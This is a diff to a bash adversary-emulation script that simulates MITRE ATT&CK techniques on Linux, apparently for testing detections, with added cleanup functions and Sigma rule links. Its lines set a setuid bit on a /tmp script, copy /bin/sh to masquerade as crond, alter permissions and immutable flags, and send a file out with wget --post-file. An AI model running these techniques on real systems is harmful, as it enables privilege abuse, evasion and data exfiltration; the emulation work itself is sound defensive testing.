@@ -206,16 +206,17 @@ function T1552-003() {
 function T1059-004() {
   echo -e "\n [+] creating and executing bash script \n"
   bash_script_path="/tmp/payme.sh"
-  sh -c "echo 'echo Hello from the Atomic Red Team' > ${bash_script_path}"
+  sh -c "echo 'echo Hello from T1059-004' > ${bash_script_path}"
   sh -c "echo 'ping -c 4 8.8.8.8' >> ${bash_script_path}"
-  chmod +x ${bash_script_path}
+  chmod u+s ${bash_script_path}
   sh ${bash_script_path}
 }
 function Cleanup_T1059-004() {
   echo -e "\n [+] Cleanup - deleting created bash script \n"
   bash_script_path="/tmp/payme.sh"
-  rm ${bash_script_path}
+  rm -rf ${bash_script_path}
 }
+
 
 
 
@@ -249,13 +250,14 @@ function T1201() {
 
   # Password policy discovery via commands
   chage --list
-  paswd -S
+  passwd -S
 }
 
 
 
 
 # T1046 - Network Service Scanning
+# Sigma Rule - https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_network_service_scanning.yml
 function T1046() {
   echo -e "\n [+] Initiating Port Scan \n"
   # Port via script
@@ -280,7 +282,7 @@ function T1046() {
 # Sigma Rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/auditd/lnx_auditd_masquerading_crond.yml
 function T1036-003() {
   echo -e "\n [+] Masquerading as Linux crond process \n"
-  cp /bin/sh /tmp/crond;
+  cp -i /bin/sh /tmp/crond;
   echo 'sleep 5' | /tmp/crond
 }
 function Cleanup_T1036-003() {
@@ -435,13 +437,18 @@ function T1222-002() {
   owner="blusapphire"
   folder="/tmp/T1222.002"
   file="/tmp/T1222.002/T1222.sh"
-  if [ ! -d ${file_folder} ]; then mkdir -p ${file_folder}; touch ${folder}/safe_to_delete; echo "curl ipinfo.io/ip" > ${file};fi;
+  if [ ! -d ${folder} ]; then mkdir -p ${folder}; touch ${folder}/safe_to_delete; echo "curl ipinfo.io/ip" > ${file}; fi;
   chmod ${premission} ${folder}
   chmod ${symbolic_mode} ${folder}
   chmod -R ${numeric_mode} ${folder}
   chmod -R ${symbolic_mode} ${folder}
   chown ${owner}:${group} ${file}
   chattr -i ${file}
+}
+function Cleanup_T1222-002() {
+  echo -e "\n [+] Cleanup - deleting created files and folders \n"
+  folder="/tmp/T1222.002"
+  if [ -d ${folder} ]; then rm -rf ${folder}; fi;
 }
 
 
@@ -518,7 +525,7 @@ function TA0010() {
   if [ ! -f ${local_file} ]; then echo "Hello from Exfil [TA0010]..!" > ${local_file}; fi;
   wget --post-file=${local_file} ${upload_url}
 }
-function Cleanup_T1485(){
+function Cleanup_TA0010(){
   echo -e "\n [+] Cleanup - Deleting files [TA0010] \n"
   local_file="/var/log/TA0010"
   if [ -f ${local_file} ]; then rm ${local_file}; fi;
@@ -695,14 +702,15 @@ Cleanup_T1562-006	# Indicator Blocking
 Cleanup_T1547-006    	# Kernel Modules and Extensions
 Cleanup_T1574-006   	# Dynamic Linker Hijacking
 Cleanup_T1564-001   	# Hidden Files and Directories
+Cleanup_T1222-002	# Linux and Mac File and Directory Permissions Modification
 Cleanup_T1562-004	# Disable or Modify System Firewall
 Cleanup_T1546-004	# Unix Shell Configuration Modification
 Cleanup_T1485		# Data Destruction
+Cleanup_TA0010		# Exfiltration
 Cleanup_T1070-006	# Timestomp
 Cleanup_T1027-001	# Binary Padding
 #Cleanup_T1113		# Screen Capture
 #Cleanup_T1027-003	# Obfuscated Files or Information: Steganography
-
 
 
 
